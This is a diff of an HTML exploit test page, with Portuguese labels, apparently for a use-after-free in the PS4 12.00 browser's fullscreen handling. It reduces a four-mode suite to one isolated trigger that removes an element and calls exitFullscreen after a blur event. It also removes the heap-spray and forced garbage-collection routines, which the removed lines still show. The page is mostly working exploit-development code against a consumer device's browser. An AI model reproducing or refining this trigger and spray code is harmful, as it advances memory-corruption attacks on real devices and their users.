@@ -2,16 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Test Suite</title>
+<title>PS4 Fullscreen UAF - Teste 4 Isolado</title>
 </head>
 <body style="background:#222;color:#fff;">
 
-<h2>PS4 12.00 - Fullscreen UAF Test Suite</h2>
+<h2>PS4 12.00 - Fullscreen UAF (Teste 4 Isolado)</h2>
 
-<button onclick="runTest(1)">Teste 1 — Completo (GC + Spray)</button><br><br>
-<button onclick="runTest(2)">Teste 2 — Sem GC</button><br><br>
-<button onclick="runTest(3)">Teste 3 — Sem Spray</button><br><br>
-<button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
+<button onclick="runTest()">Teste 4 — Apenas remove + exitFullscreen</button>
 
 <div id="log" style="margin-top:20px;"></div>
 
@@ -56,28 +53,6 @@ function setupFullscreen() {
     return fsTarget;
 }
 
-function doGC(controllers) {
-    log("[*] Forçando GC...");
-    controllers = null;
-
-    for (let i = 0; i < 20000; i++) {
-        new ArrayBuffer(0x10000);
-    }
-}
-
-function doSpray() {
-    log("[*] Executando spray...");
-    let spray = [];
-
-    for(let i = 0; i < 8000; i++) {
-        let p = new Float64Array(10);
-        p.fill(PATTERN);
-        spray.push(p);
-    }
-
-    return spray;
-}
-
 function trigger(fsTarget) {
     log("[*] Trigger: remove + exitFullscreen");
 
@@ -94,11 +69,11 @@ function trigger(fsTarget) {
     setTimeout(() => location.reload(), 500);
 }
 
-function runTest(mode) {
+function runTest() {
     const logDiv = document.getElementById("log");
     logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
 
-    log("[*] Iniciando teste " + mode);
+    log("[*] Iniciando teste 4");
 
     let controllers = setupHeap();
     let fsTarget = setupFullscreen();
@@ -106,36 +81,8 @@ function runTest(mode) {
     window.onblur = function() {
         log("[*] onblur disparado");
 
-        // =========================
-        // TESTES
-        // =========================
-
-        if (mode === 1) {
-            // COMPLETO
-            doGC(controllers);
-            let spray = doSpray();
-
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 2) {
-            // SEM GC
-            let spray = doSpray();
-
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 3) {
-            // SEM SPRAY
-            doGC(controllers);
-
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
-
-        else if (mode === 4) {
-            // MINIMO (CIRÚRGICO)
-            setTimeout(() => trigger(fsTarget), 3000);
-        }
+        // TESTE 4 ORIGINAL (INALTERADO)
+        setTimeout(() => trigger(fsTarget), 3000);
     };
 }
 </script>
